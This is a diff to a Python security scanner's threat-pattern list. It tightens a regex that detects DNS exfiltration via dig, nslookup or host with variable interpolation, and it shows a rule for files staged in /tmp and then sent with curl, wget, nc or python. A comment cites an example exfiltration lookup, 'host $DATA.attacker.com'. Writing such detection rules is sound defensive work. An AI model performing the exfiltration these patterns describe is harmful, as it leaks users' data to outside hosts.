@@ -149,10 +149,12 @@ THREAT_PATTERNS = [
     # ── Exfiltration: DNS and staging ──
     # Do not match flag names such as llama.cpp `--host 127.0.0.1 --port $PORT`. The `$`-interpolated
     # token must be a DNS argument, not a path: prose like "Set the host value and run
-    # `${SKILL_DIR}/scripts/check.py`." interpolates a path (the `$…` token contains `/` or `\`),
-    # while a lookup interpolates a hostname — `host $DATA.attacker.com` — and a hostname cannot
-    # contain a slash, so only unqueryable forms are exempted (#108873).
-    (r'(?<![-/])\b(dig|nslookup|host)\s+[^\n]*\$(?![^\s\n]*[/\\])',
+    # `${SKILL_DIR}/scripts/check.py`." interpolates a path (the `$…` token contains `/` or a
+    # mid-token `\`), while a lookup interpolates a hostname — `host $DATA.attacker.com` — and a
+    # hostname cannot contain a slash, so only unqueryable forms are exempted (#108873). A `\` only
+    # counts as a path separator when followed by another non-space character (`\scripts`); a `\`
+    # at end-of-token is a shell line continuation, not a path char, so it must not exempt the line.
+    (r'(?<![-/])\b(dig|nslookup|host)\s+[^\n]*\$(?![^\s\n]*(?:/|\\(?=\S)))',
      "dns_exfil", "critical", "exfiltration", "DNS lookup with variable interpolation (possible DNS exfiltration)"),
     (r'>\s*/tmp/[^\s]*\s*&&\s*(curl|wget|nc|python)',
      "tmp_staging", "critical", "exfiltration", "writes to /tmp then exfiltrates"),
